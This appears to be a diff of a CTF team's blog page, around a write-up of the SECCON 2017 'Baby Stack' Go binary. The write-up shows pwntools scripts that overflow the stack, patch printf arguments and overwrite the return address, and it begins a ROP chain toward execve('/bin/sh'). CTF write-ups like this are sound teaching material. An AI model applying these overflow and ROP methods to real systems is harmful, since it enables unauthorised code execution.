       </div>
       
       <div class="search" id="search-form-wrap">
@@ -68,23 +73,23 @@
         <div class="input-group">
             <input type="text" class="search-form-input form-control" placeholder="Search" />
             <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
             </span>
         </div>
     </form>
     <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
 </div>
+
 
 </div>
       <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
@@ -94,14 +99,14 @@
         <span class="icon-bar"></span>
       </button>
     </div>
-    <nav id="main-navbar" class="collapse navbar-collapse">
-      <ul class="nav navbar-nav main-nav">
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
         
         
         <li class="menu-item menu-item-home">
           <a href="/.">
             
-            <i class="fa fa-fw fa-home"></i>
+            <i class="icon icon-home-fill"></i>
             
             <span class="menu-title">Home</span>
           </a>
@@ -111,7 +116,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives">
             
-            <i class="fa fa-fw fa-archive"></i>
+            <i class="icon icon-archives-fill"></i>
             
             <span class="menu-title">Archives</span>
           </a>
@@ -121,7 +126,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories">
             
-            <i class="fa fa-fw fa-folder"></i>
+            <i class="icon icon-folder"></i>
             
             <span class="menu-title">Categories</span>
           </a>
@@ -131,19 +136,9 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags">
             
-            <i class="fa fa-fw fa-tags"></i>
+            <i class="icon icon-tags"></i>
             
             <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-competitions">
-          <a href="/competitions">
-            
-            <i class="fa fa-fw fa-flag"></i>
-            
-            <span class="menu-title">Competitions</span>
           </a>
         </li>
         
@@ -151,47 +146,37 @@
         <li class="menu-item menu-item-about">
           <a href="/about">
             
-            <i class="fa fa-fw fa-users"></i>
+            <i class="icon icon-users"></i>
             
             <span class="menu-title">About</span>
           </a>
         </li>
         
       </ul>
-      <div class="footer">
-	
+      
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
         
     </ul>
-    
-    <div class="copyright">
-        &copy; 2022 TEAMROCKETIST
-        <div class="publishby">
-        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.-->
-        </div>
-    </div>
-</div>
+
     </nav>
   </div>
-</section>
+</header>
 
   
-    <section class="sidebar">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
   <div class="slimContent">
     
       <div class="widget">
     <h3 class="widget-title">Board</h3>
     <div class="widget-body">
         <div id="board">
-            
             <div class="content">
                 <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
             </div>
@@ -249,7 +234,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
               </p>
               <p class="item-title">
                 <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
@@ -264,7 +249,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
@@ -294,7 +279,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
@@ -327,14 +312,15 @@
 
     
   </div>
-</section>
+</aside>
 
   
-  <section class="main">
+  
+<main class="main" role="main">
   <div class="content">
-  <article id="post-Pwn-SECCON-Baby-Stack" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-SECCON-Baby-Stack" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-    <header class="article-header">
+    <div class="article-header">
       
         
   
@@ -346,44 +332,48 @@
       
       <div class="article-meta">
         <span class="article-date">
-    <i class="fa fa-calendar-check-o"></i>
+    <i class="icon icon-calendar-check"></i>
 	<a href="/2017/12/13/Pwn-SECCON-Baby-Stack/" class="article-date">
 	  <time datetime="2017-12-13T04:05:45.000Z" itemprop="datePublished">2017-12-13</time>
 	</a>
 </span>
         
   <span class="article-category">
-    <i class="fa fa-folder"></i>
+    <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/x64/">x64</a>►<a class="article-category-link" href="/categories/Pwn/x64/Stack-Issue/">Stack Issue</a>►<a class="article-category-link" href="/categories/Pwn/x64/Stack-Issue/Stack-Overflow/">Stack Overflow</a>
   </span>
 
         
   <span class="article-tag">
-    <i class="fa fa-tag"></i>
+    <i class="icon icon-tags"></i>
 	<a class="article-tag-link" href="/tags/go/">go</a>, <a class="article-tag-link" href="/tags/pwn/">pwn</a>, <a class="article-tag-link" href="/tags/rop/">rop</a>, <a class="article-tag-link" href="/tags/seccon2017/">seccon2017</a>, <a class="article-tag-link" href="/tags/stack-overflow/">stack_overflow</a>, <a class="article-tag-link" href="/tags/statically-linked/">statically_linked</a>
   </span>
 
 
         
 
-		
-        <span class="post-comment"><i class="fa fa-commenting-o"></i> <a href="/2017/12/13/Pwn-SECCON-Baby-Stack/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2017/12/13/Pwn-SECCON-Baby-Stack/#comments" class="article-comment-link">Comments</a></span>
         
-		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 2,614 (words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2,613(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs">Read Time: 16 (min)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 16(minutes)</span>
 	
 
       </div>
-    </header>
-    <div class="article-entry" itemprop="articleBody">
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
       
-        <blockquote><br>Baby Stack<br><br>Can you do a traditional stack attack?<br><br>Host : baby_stack.pwn.seccon.jp<br>Port : 15285<br>baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8<br></blockquote>
-
-<h3 id="Overflow-the-Buffer"><a href="#Overflow-the-Buffer" class="headerlink" title="Overflow the Buffer"></a>Overflow the Buffer</h3><p>We have a <strong>go executable</strong> which is <strong>harder</strong> to reverse than c, by reading the challenge title we can see that this challenge is probably about a <strong>buffer overflow in the stack</strong>, another thing we also notice that the binary is <strong>statically linked</strong>:</p>
+        <blockquote>
+Baby Stack
+<p>Can you do a traditional stack attack?</p>
+<p>Host : baby_stack.pwn.seccon.jp<br>
+Port : 15285<br>
+baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8</p>
+</blockquote>
+<h3 id="overflow-the-buffer"><a class="markdownIt-Anchor" href="#overflow-the-buffer"></a> Overflow the Buffer</h3>
+<p>We have a <strong>go executable</strong> which is <strong>harder</strong> to reverse than c, by reading the challenge title we can see that this challenge is probably about a <strong>buffer overflow in the stack</strong>, another thing we also notice that the binary is <strong>statically linked</strong>:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
 <p>Since is statically linked we know that this binary <strong>isn’t</strong> going to use the <strong>libc file in our system</strong>, every libc function used is <strong>embedded</strong> in the binary itself, this a problem we can’t just jump into libc because some useful functions like <strong>system</strong> aren’t present, but we can still build a ROP chain that does a system call to execve, this is very similar to writting shellcode but instead of writting a script we are going to use gadgets to build it.</p>
 <p>By checking the security of the binary we can see the only protection enabled is <strong>NX (Non-Executable Stack)</strong>.</p>
@@ -391,7 +381,14 @@
 <p>We don’t have a stack canary to stop us so the first thing to do is to run the binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</span><br><span class="line">unexpected fault address 0x0</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x80 addr=0x0 pc=0x456551]</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">runtime.throw(0x507550, 0x5)</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0</span><br><span class="line">runtime.sigpanic()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8</span><br><span class="line">runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608</span><br><span class="line">fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610</span><br><span class="line">fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730</span><br><span class="line">fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760</span><br><span class="line">fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790</span><br><span class="line">fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918</span><br><span class="line">fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0</span><br><span class="line">fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0)</span><br><span class="line">	/usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8</span><br><span class="line">main.main()</span><br><span class="line">	/home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50</span><br><span class="line">runtime.main()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50</span><br><span class="line">runtime.goexit()</span><br><span class="line">	/usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0</span><br></pre></td></tr></table></figure>
 <p>We did overflow the buffer but what really happened here? If you look at the stack traces we <strong>aren’t</strong> really getting a <strong>segmentation fault</strong> because we are replacing the ret address, the exception is occurring because we are changing the parameters of <strong><code>fmt.Printf</code></strong>, the binary isn’t reaching the <strong><code>ret</code></strong> instruction because of this, we need to set some <strong>break points</strong> before this prints to put the correct addresses on them, something that doesn’t crash the program.</p>
-<p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br><a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0kyUAPc.png" alt><br></a><br>Checking it on another view to check its addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/HEuxv0i.png" alt><br></a></p>
+<p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/0kyUAPc.png" alt><br>
+</a><br>
+Checking it on another view to check its addresses:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/HEuxv0i.png" alt><br>
+</a></p>
 <p>After setting some breakpoints in the <strong>printf’s</strong> after those 2 scans, I realised that the padding needed to reach the 1st parameter was <strong>104</strong> so we can start testing it in the binary:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*104 + 'BBBBBBBB'"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </span><br><span class="line">Please tell me your name &gt;&gt; A</span><br><span class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</span><br><span class="line">...</span><br><span class="line">runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 <p>There it is, we are replacing the address of the string that <strong><code>printf</code></strong> wants to print, we can’t continue overflowing the rest to reach the <strong><code>ret</code></strong> instruction, to get this valid address I just picked a value that I got from gdb from the stack:</p>
@@ -400,45 +397,54 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + <span class="string">'AAAAAAAA'</span></span><br><span class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>By running it we can see we are still replacing another parameter from <strong><code>printf</code></strong>:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python writeup.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>: pid 8433</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">panic: runtime error: growslice: <span class="built_in">cap</span> out of range</span><br><span class="line"></span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">panic(0x4e4800, 0xc820070280)</span><br><span class="line">    /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6</span><br><span class="line">fmt.(*fmt).padString(0xc820076ef8, 0xc82003fd58, 0x4141414141414141)</span><br></pre></td></tr></table></figure>
-<p>In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be <strong><code>0x0000000000000002</code></strong>, <strong><code>printf</code></strong> will print 2 characters starting by the address we gave before in the previous 8 bytes (<strong><code>0xc82003fd58</code></strong>). So lets readjust our script to do this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be <strong><code>0x0000000000000002</code></strong>, <strong><code>printf</code></strong> will print 2 characters starting by the address we gave before in the previous 8 bytes (<strong><code>0xc82003fd58</code></strong>). So lets readjust our script to do this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup.py</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Thank you, \x18\x00\x00!</span><br><span class="line">msg : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
-<p>As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string “Thank you, “ we need to calculate the offset to the next <strong><code>printf</code></strong> and do the same thing, give an address and the number of bytes to be printed, <strong>only then</strong> we can <strong>replace the return address</strong> with success! So after calculating everything our script will look like this:</p>
+<p>As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string &quot;Thank you, &quot; we need to calculate the offset to the next <strong><code>printf</code></strong> and do the same thing, give an address and the number of bytes to be printed, <strong>only then</strong> we can <strong>replace the return address</strong> with success! So after calculating everything our script will look like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">off_printf1 = <span class="number">104</span></span><br><span class="line">off_printf2 = <span class="number">80</span></span><br><span class="line">off_retaddress = <span class="number">192</span></span><br><span class="line">padding_printf1 = <span class="string">'A'</span> * off_printf1 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">padding_printf2 = <span class="string">'A'</span> * off_printf2 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</span><br><span class="line">padding_retaddresss = <span class="string">'A'</span>*off_retaddress + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">padding = padding_printf1 + padding_printf2 + padding_retaddresss</span><br><span class="line">r = process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</span><br><span class="line">r.sendline(padding)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>And finally we succefully smashed the stack! and replaced the return address to <strong><code>0xdeadbeef</code></strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup.py </span><br><span class="line">...</span><br><span class="line">Thank you, \x18\x00\x00!</span><br><span class="line">msg : X�</span><br><span class="line">unexpected fault address 0xdeadbeef</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef]</span><br></pre></td></tr></table></figure></p>
-<h3 id="Build-a-ropchain"><a href="#Build-a-ropchain" class="headerlink" title="Build a ropchain"></a>Build a ropchain</h3><p>Now that we replaced the return address to <strong><code>0xdeadbeef</code></strong> we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments:</p>
+<p>And finally we succefully smashed the stack! and replaced the return address to <strong><code>0xdeadbeef</code></strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python writeup.py </span><br><span class="line">...</span><br><span class="line">Thank you, \x18\x00\x00!</span><br><span class="line">msg : X�</span><br><span class="line">unexpected fault address 0xdeadbeef</span><br><span class="line">fatal error: fault</span><br><span class="line">[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef]</span><br></pre></td></tr></table></figure>
+<h3 id="build-a-ropchain"><a class="markdownIt-Anchor" href="#build-a-ropchain"></a> Build a ropchain</h3>
+<p>Now that we replaced the return address to <strong><code>0xdeadbeef</code></strong> we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(RAX, RDI, RSI, RDX)</span><br></pre></td></tr></table></figure>
 <p>Where <strong><code>RAX</code></strong> is the system call number and <strong><code>RDI</code></strong> must have an address that points into <strong>‘/bin/sh’</strong> the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets.</p>
-<h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VtO8xjO.png" alt><br></a></p>
+<h4 id="setting-binsh-address-to-rdi"><a class="markdownIt-Anchor" href="#setting-binsh-address-to-rdi"></a> Setting /bin/sh address to RDI</h4>
+<p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/VtO8xjO.png" alt><br>
+</a></p>
 <p><strong>.bss</strong> is perfect its address doesn’t change on different runs because <strong><code>PIE</code></strong> protection isn’t enabled, and as the picture above says in IDA we have <strong><code>read</code></strong> and <strong><code>write</code></strong> permissions which is what we want.</p>
